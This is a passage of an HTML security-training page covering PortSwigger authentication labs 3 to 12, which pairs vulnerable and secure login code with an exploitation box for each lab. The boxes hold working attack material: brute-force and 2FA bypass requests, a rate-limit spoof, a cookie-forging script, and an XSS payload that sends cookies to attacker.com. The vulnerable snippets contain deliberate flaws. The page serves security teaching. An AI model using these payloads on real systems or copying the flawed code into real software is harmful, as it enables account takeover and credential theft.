                        <button class="code-tab active" data-view="vulnerable" data-lab="lab3"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab3"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab3-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()

<span class="vuln-line">    if not user:</span>
<span class="vuln-line">        # ❌ Returns immediately - no password hash computed!</span>
<span class="vuln-line">        return error_response('Invalid credentials')</span>

<span class="vuln-line">    # ❌ bcrypt.check() is SLOW (~100-500ms)</span>
<span class="vuln-line">    # Only executed for valid usernames!</span>
<span class="vuln-line">    if not bcrypt.check_password_hash(user.password, password):</span>
        return error_response('Invalid credentials')

    return success_response(user)</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab3-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()

<span class="secure-line">    # ✅ Always perform hash check to ensure consistent timing</span>
<span class="secure-line">    if user:</span>
<span class="secure-line">        valid = bcrypt.check_password_hash(user.password, password)</span>
<span class="secure-line">    else:</span>
<span class="secure-line">        # Dummy hash to prevent timing attack</span>
<span class="secure-line">        bcrypt.check_password_hash(DUMMY_HASH, password)</span>
<span class="secure-line">        valid = False</span>

<span class="secure-line">    if not user or not valid:</span>
<span class="secure-line">        return error_response('Invalid credentials')</span>

    return success_response(user)</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Burp Intruder Setup</span>
# 1. Use a VERY LONG password (200+ chars) to amplify timing
# 2. Add "Response received" column in Intruder
# 3. Sort by response time
# 4. Valid usernames will have significantly longer response times

X-Forwarded-For: §1.1.1.1§  # Bypass IP rate limiting
username=§admin§&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
                    </div>
                </div>
                <div class="remediation-section">
                    <h3><i class="fas fa-shield-alt"></i> Remediation</h3>
                    <div class="remediation-list">
                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Always Hash:</strong> Perform dummy password hash even for non-existent users.</p></div>
                        <div class="remediation-item"><i class="fas fa-check-circle"></i><p><strong>Constant Time:</strong> Use constant-time comparison functions.</p></div>
                    </div>
                </div>
            </div>

            <!-- Lab 4: Username Enumeration via Account Lock -->
            <div id="username-enum-lock" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-lock"></i> Lab 4: Username Enumeration via Account Lock</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The account lockout mechanism reveals valid usernames. When too many failed attempts occur
                        for a valid user, the response changes to indicate the account is locked.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Invalid username: Always returns "Invalid credentials"</li>
                        <li>Valid username after lockout: Returns "Account locked" or similar</li>
                        <li>Lockout only triggers for existing accounts</li>
                        <li>Send 5+ requests per username to trigger lockout message</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab4"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab4"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab4-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    user = User.query.filter_by(username=username).first()

    if not user:
        return error('Invalid credentials')

<span class="vuln-line">    # ❌ Lockout check only for EXISTING users!</span>
<span class="vuln-line">    if user.failed_attempts >= 5:</span>
<span class="vuln-line">        return error('Account locked. Try again in 1 minute.')  # ❌ Reveals valid user!</span>

    if not verify_password(user.password, password):
        user.failed_attempts += 1
        db.session.commit()
        return error('Invalid credentials')

    user.failed_attempts = 0
    return success(user)</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab4-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

<span class="secure-line">    # ✅ Check lockout BEFORE revealing if user exists</span>
<span class="secure-line">    if is_ip_locked(request.remote_addr):</span>
<span class="secure-line">        return error('Too many attempts. Try again later.')</span>

    user = User.query.filter_by(username=username).first()

<span class="secure-line">    # ✅ Generic lockout check - doesn't reveal user existence</span>
<span class="secure-line">    if user:</span>
<span class="secure-line">        valid = verify_password(user.password, password)</span>
<span class="secure-line">    else:</span>
<span class="secure-line">        verify_password(DUMMY_HASH, password)</span>
<span class="secure-line">        valid = False</span>

<span class="secure-line">    if not valid:</span>
<span class="secure-line">        increment_failed_attempts(request.remote_addr)</span>
<span class="secure-line">        return error('Invalid credentials')</span>

    return success(user)</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Cluster Bomb Attack</span>
# Payload 1: Username list
# Payload 2: Null payloads (repeat 5-10 times per username)

# Grep for: "Account locked" or "too many attempts"
# These responses indicate VALID usernames!
                    </div>
                </div>
            </div>

            <!-- Lab 5: Broken Brute-Force Protection - IP Block -->
            <div id="bruteforce-ip-block" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-ban"></i> Lab 5: Broken Brute-Force Protection - IP Block</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The IP-based rate limiting resets after a successful login. Attackers can bypass
                        brute-force protection by alternating between valid and invalid credentials.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Failed login counter resets on successful login</li>
                        <li>Counter is per-IP, not per-account</li>
                        <li>Attacker can login with own valid creds between brute-force attempts</li>
                        <li>Pattern: try victim password → login as self → repeat</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab5"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab5"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab5-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>rate_limiter.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">def check_rate_limit(ip_address):
    attempts = get_failed_attempts(ip_address)
    if attempts >= 3:
        raise RateLimitError("Too many failed attempts")

def login(username, password, ip_address):
    check_rate_limit(ip_address)

    if authenticate(username, password):
<span class="vuln-line">        # ❌ Resets counter for the IP on ANY successful login</span>
<span class="vuln-line">        reset_failed_attempts(ip_address)</span>
        return success()
    else:
        increment_failed_attempts(ip_address)
        return failure()</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab5-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>rate_limiter.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"><span class="secure-line">def check_rate_limit(ip_address, username):</span>
<span class="secure-line">    # ✅ Track attempts per IP AND per username</span>
<span class="secure-line">    ip_attempts = get_failed_attempts_by_ip(ip_address)</span>
<span class="secure-line">    user_attempts = get_failed_attempts_by_user(username)</span>
<span class="secure-line">    if ip_attempts >= 10 or user_attempts >= 5:</span>
<span class="secure-line">        raise RateLimitError("Too many failed attempts")</span>

def login(username, password, ip_address):
    check_rate_limit(ip_address, username)

    if authenticate(username, password):
<span class="secure-line">        # ✅ Only reset counter for THIS user, not the IP</span>
<span class="secure-line">        reset_failed_attempts_by_user(username)</span>
        return success()
    else:
<span class="secure-line">        increment_failed_attempts(ip_address, username)</span>
        return failure()</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Pitchfork Attack Payload</span>
# Alternate between victim and attacker credentials:
carlos:password1
wiener:peter    # Valid login - resets counter!
carlos:password2
wiener:peter    # Reset again
carlos:password3
wiener:peter
...
                    </div>
                </div>
            </div>

            <!-- Lab 6: Broken Brute-Force Protection - Multiple Credentials -->
            <div id="bruteforce-multiple-creds" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-list"></i> Lab 6: Broken Brute-Force Protection - Multiple Credentials</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Expert</span></div>
                    </div>
                    <p class="lab-description">
                        The login endpoint accepts JSON arrays of credentials, allowing attackers to test
                        multiple passwords in a single request, bypassing per-request rate limiting.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>API accepts array of credentials in single request</li>
                        <li>Rate limiting counts requests, not credential attempts</li>
                        <li>Send 100 passwords in one request = 1 "attempt"</li>
                        <li>Bypasses most rate limiting implementations</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab6"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab6"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab6-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-node-js"></i><span>auth.js</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-javascript">app.post('/login', rateLimit({ max: 5 }), (req, res) => {
    const { username, password } = req.body;

<span class="vuln-line">    // ❌ Accepts arrays without validation!</span>
<span class="vuln-line">    const passwords = Array.isArray(password) ? password : [password];</span>

<span class="vuln-line">    for (const pwd of passwords) {</span>
<span class="vuln-line">        if (authenticate(username, pwd)) {</span>
<span class="vuln-line">            return res.json({ success: true });</span>
<span class="vuln-line">        }</span>
<span class="vuln-line">    }</span>

    res.status(401).json({ error: 'Invalid credentials' });
});</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab6-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-node-js"></i><span>auth.js (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-javascript">app.post('/login', rateLimit({ max: 5 }), (req, res) => {
    const { username, password } = req.body;

<span class="secure-line">    // ✅ Validate password is a string, not array</span>
<span class="secure-line">    if (typeof password !== 'string') {</span>
<span class="secure-line">        return res.status(400).json({ error: 'Invalid input' });</span>
<span class="secure-line">    }</span>

<span class="secure-line">    if (authenticate(username, password)) {</span>
<span class="secure-line">        return res.json({ success: true });</span>
<span class="secure-line">    }</span>

    res.status(401).json({ error: 'Invalid credentials' });
});</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">JSON Array Payload</span>
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": "carlos",
    "password": [
        "123456", "password", "admin", "letmein",
        "welcome", "monkey", "dragon", "master",
        ... // 100+ passwords in single request!
    ]
}
                    </div>
                </div>
            </div>

            <!-- Lab 7: 2FA Simple Bypass -->
            <div id="2fa-simple" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-mobile-alt"></i> Lab 7: 2FA Simple Bypass</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
                    </div>
                    <p class="lab-description">
                        The 2FA verification page can be skipped by directly navigating to the post-login page.
                        The application doesn't verify that 2FA was completed before granting access.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>After password login, user redirected to /login2 for 2FA code</li>
                        <li>Session is marked as "partially authenticated" after password</li>
                        <li>Protected pages don't verify 2FA completion status</li>
                        <li>Simply navigate to /my-account to bypass 2FA entirely!</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab7"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab7"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab7-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    if authenticate(username, password):
<span class="vuln-line">        session['user_id'] = user.id  # ❌ Session created before 2FA!</span>
        return redirect('/login2')  # 2FA page

@app.route('/my-account')
def my_account():
<span class="vuln-line">    # ❌ Only checks if user_id exists, not 2FA completion!</span>
<span class="vuln-line">    if 'user_id' not in session:</span>
<span class="vuln-line">        return redirect('/login')</span>
    return render_template('account.html')</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab7-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
def login():
    if authenticate(username, password):
<span class="secure-line">        session['pending_2fa'] = user.id  # ✅ Pending, not authenticated!</span>
        return redirect('/login2')

@app.route('/my-account')
@login_required
def my_account():
<span class="secure-line">    # ✅ Decorator checks BOTH user_id AND 2fa_complete</span>
    return render_template('account.html')

<span class="secure-line">def login_required(f):</span>
<span class="secure-line">    def wrapper(*args, **kwargs):</span>
<span class="secure-line">        if 'user_id' not in session or not session.get('2fa_complete'):</span>
<span class="secure-line">            return redirect('/login')</span>
<span class="secure-line">        return f(*args, **kwargs)</span>
<span class="secure-line">    return wrapper</span></code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Bypass Steps</span>
1. Login with valid credentials → redirected to /login2
2. Don't enter 2FA code
3. Manually change URL to /my-account
4. Access granted without 2FA!
                    </div>
                </div>
            </div>

            <!-- Lab 8: 2FA Broken Logic -->
            <div id="2fa-broken-logic" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-bug"></i> Lab 8: 2FA Broken Logic</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The 2FA verification uses a user-controllable parameter to determine which account's code to verify,
                        allowing attackers to bypass 2FA for any account.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>2FA verification form includes a <code>verify</code> cookie or hidden field</li>
                        <li>This parameter determines which user's 2FA code to verify</li>
                        <li>Attacker can change parameter to victim's username</li>
                        <li>Brute-force 4-digit code (0000-9999) for victim account</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab8"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab8"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab8-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
def verify_2fa():
<span class="vuln-line">    # ❌ Username from cookie - user-controllable!</span>
<span class="vuln-line">    username = request.cookies.get('verify')</span>
    code = request.form.get('mfa-code')

    user = User.query.filter_by(username=username).first()

    if user and user.mfa_code == code:
        session['user_id'] = user.id
<span class="vuln-line">        session['2fa_complete'] = True  # ❌ Attacker gets access to victim!</span>
        return redirect('/my-account')

    return error('Invalid code')</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab8-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
def verify_2fa():
<span class="secure-line">    # ✅ Get username from SERVER-SIDE session only</span>
<span class="secure-line">    if 'pending_2fa' not in session:</span>
<span class="secure-line">        return redirect('/login')</span>
<span class="secure-line">    user_id = session['pending_2fa']</span>
    code = request.form.get('mfa-code')

<span class="secure-line">    user = User.query.get(user_id)</span>

    if user and user.mfa_code == code:
<span class="secure-line">        del session['pending_2fa']</span>
        session['user_id'] = user.id
        session['2fa_complete'] = True
        return redirect('/my-account')

    return error('Invalid code')</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Attack Request</span>
POST /login2 HTTP/1.1
Cookie: verify=carlos  # ← Changed to victim!
Content-Type: application/x-www-form-urlencoded

mfa-code=§0000§  # Brute-force 0000-9999
                    </div>
                </div>
            </div>

            <!-- Lab 9: 2FA Brute-Force -->
            <div id="2fa-bruteforce" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-hammer"></i> Lab 9: 2FA Bypass via Brute-Force</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Expert</span></div>
                    </div>
                    <p class="lab-description">
                        The 2FA implementation has no rate limiting and logs out users after 2 wrong attempts.
                        Using macros to automatically re-login, attackers can brute-force the 4-digit code.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>2FA code is only 4 digits (10,000 combinations)</li>
                        <li>User logged out after 2 wrong attempts</li>
                        <li>No overall rate limiting or lockout</li>
                        <li>Burp Macros can automate re-login between attempts</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab9"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab9"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab9-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
def verify_2fa():
    code = request.form.get('mfa-code')
    user = get_current_user()

<span class="vuln-line">    # ❌ Logout after 2 wrong attempts, but no permanent lockout</span>
<span class="vuln-line">    if user.mfa_attempts >= 2:</span>
<span class="vuln-line">        session.clear()  # Just logs out</span>
<span class="vuln-line">        return redirect('/login')</span>

    if user.mfa_code == code:
        session['2fa_complete'] = True
        return redirect('/my-account')

<span class="vuln-line">    user.mfa_attempts += 1  # ❌ Resets on re-login!</span>
    return error('Invalid code')</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab9-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
<span class="secure-line">@rate_limit(max=10, window=300)  # ✅ Rate limit on 2FA</span>
def verify_2fa():
    code = request.form.get('mfa-code')
    user = get_current_user()

<span class="secure-line">    # ✅ Permanent lockout tracked in database</span>
<span class="secure-line">    if user.mfa_lockout_until and user.mfa_lockout_until > datetime.now():</span>
<span class="secure-line">        return error('Account locked. Contact support.')</span>

<span class="secure-line">    if user.mfa_attempts >= 5:</span>
<span class="secure-line">        user.mfa_lockout_until = datetime.now() + timedelta(hours=1)</span>
<span class="secure-line">        return error('Too many attempts. Locked for 1 hour.')</span>

    if user.mfa_code == code:
        user.mfa_attempts = 0
        session['2fa_complete'] = True
        return redirect('/my-account')

    user.mfa_attempts += 1
    return error('Invalid code')</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Burp Macro Setup</span>
# 1. Create macro: GET /login → POST /login (with creds) → GET /login2
# 2. Add session handling rule to run macro before each request
# 3. Intruder: brute-force mfa-code from 0000-9999
# 4. Macro automatically re-logs in after logout!
                    </div>
                </div>
            </div>

            <!-- Lab 10: Stay-Logged-In Cookie -->
            <div id="stay-logged-in" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-cookie"></i> Lab 10: Brute-Forcing Stay-Logged-In Cookie</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        The "stay logged in" cookie is constructed from predictable values (username + MD5 password hash).
                        Attackers can brute-force passwords by generating candidate cookies.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Cookie format: <code>base64(username:md5(password))</code></li>
                        <li>MD5 is fast to compute and has rainbow tables</li>
                        <li>Generate cookies for each password guess</li>
                        <li>Valid cookie grants access without login</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab10"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab10"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab10-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">def create_remember_cookie(user):
<span class="vuln-line">    # ❌ Predictable cookie construction</span>
<span class="vuln-line">    token = f"{user.username}:{hashlib.md5(user.password.encode()).hexdigest()}"</span>
<span class="vuln-line">    return base64.b64encode(token.encode()).decode()</span>

def verify_remember_cookie(cookie):
    decoded = base64.b64decode(cookie).decode()
    username, password_hash = decoded.split(':')
    user = User.query.filter_by(username=username).first()

<span class="vuln-line">    # ❌ Compares MD5 hash - brute-forceable!</span>
<span class="vuln-line">    if hashlib.md5(user.password.encode()).hexdigest() == password_hash:</span>
        return user
    return None</code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab10-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">import secrets
import hmac
import hashlib

def create_remember_cookie(user):
<span class="secure-line">    # ✅ Generate cryptographically secure random token</span>
<span class="secure-line">    token = secrets.token_urlsafe(32)</span>
<span class="secure-line">    # ✅ Store token hash in database, not password-derived value</span>
<span class="secure-line">    user.remember_token = hashlib.sha256(token.encode()).hexdigest()</span>
<span class="secure-line">    user.token_expiry = datetime.utcnow() + timedelta(days=30)</span>
    db.session.commit()
<span class="secure-line">    return f"{user.id}:{token}"  # ✅ No password material in cookie</span>

def verify_remember_cookie(cookie):
    try:
        user_id, token = cookie.split(':')
        user = User.query.get(int(user_id))

<span class="secure-line">        # ✅ Check token expiry</span>
<span class="secure-line">        if user.token_expiry < datetime.utcnow():</span>
<span class="secure-line">            return None</span>

<span class="secure-line">        # ✅ Constant-time comparison prevents timing attacks</span>
<span class="secure-line">        token_hash = hashlib.sha256(token.encode()).hexdigest()</span>
<span class="secure-line">        if hmac.compare_digest(user.remember_token, token_hash):</span>
            return user
    except:
        pass
    return None</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">Cookie Generation Script</span>
import hashlib, base64

username = "carlos"
passwords = ["password", "123456", "admin", ...]

for pwd in passwords:
    md5_hash = hashlib.md5(pwd.encode()).hexdigest()
    cookie = base64.b64encode(f"{username}:{md5_hash}".encode()).decode()
    print(cookie)  # Use in Intruder
                    </div>
                </div>
            </div>

            <!-- Lab 11: Offline Password Cracking -->
            <div id="offline-cracking" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-database"></i> Lab 11: Offline Password Cracking</h2>
                    <div class="lab-meta">
                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
                    </div>
                    <p class="lab-description">
                        A stay-logged-in cookie containing a password hash can be stolen via XSS.
                        The weak hash (MD5) can be cracked offline using rainbow tables or hashcat.
                    </p>
                </div>
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>Stay-logged-in cookie contains MD5 password hash</li>
                        <li>XSS vulnerability allows stealing the cookie</li>
                        <li>MD5 hash can be cracked with rainbow tables instantly</li>
                        <li>crackstation.net, hashcat, john the ripper</li>
                    </ul>
                </div>
                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab11"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab11"><i class="fas fa-shield-alt"></i> Secure Code</button>
                    </div>
                    <div class="code-container" id="lab11-vulnerable">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python"># Cookie stored: base64(carlos:26323c16d5f4dabff3bb136f2460a943)
# Decoded: carlos:26323c16d5f4dabff3bb136f2460a943
# MD5 hash easily cracked → "onceuponatime"

<span class="vuln-line">response.set_cookie('stay-logged-in', cookie,</span>
<span class="vuln-line">                    httponly=False)  # ❌ Accessible via JavaScript!</span></code></pre>
                        </div>
                    </div>
                    <div class="code-container hidden" id="lab11-secure">
                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
                        <div class="code-block">
                            <pre><code class="language-python">import secrets

def create_remember_token():
<span class="secure-line">    # ✅ Generate secure random token (not derived from password)</span>
<span class="secure-line">    token = secrets.token_urlsafe(64)</span>
    return token

<span class="secure-line">response.set_cookie('stay-logged-in', token,</span>
<span class="secure-line">                    httponly=True,    # ✅ Not accessible via JavaScript</span>
<span class="secure-line">                    secure=True,      # ✅ HTTPS only</span>
<span class="secure-line">                    samesite='Strict' # ✅ Prevent CSRF</span>
<span class="secure-line">                    )</span>

# Token stored in DB with:
# - User ID association
# - Expiration timestamp
# - Bcrypt/Argon2 hash (not MD5!)</code></pre>
                        </div>
                    </div>
                </div>
                <div class="payload-section">
                    <h3><i class="fas fa-code"></i> Exploitation</h3>
                    <div class="payload-box">
                        <span class="payload-label">XSS Cookie Stealing</span>
&lt;script&gt;
document.location='https://attacker.com/steal?c='+document.cookie
&lt;/script&gt;

# Captured: stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
# Decode base64 → carlos:26323c16d5f4dabff3bb136f2460a943
# Crack MD5 on crackstation.net → "onceuponatime"
                    </div>
                </div>
            </div>

            <!-- Lab 12: Password Reset Broken Logic -->
            <div id="reset-broken-logic" class="lab-content hidden">
                <div class="lab-header">
                    <h2><i class="fas fa-undo"></i> Lab 12: Password Reset Broken Logic</h2>
                    <div class="lab-meta">
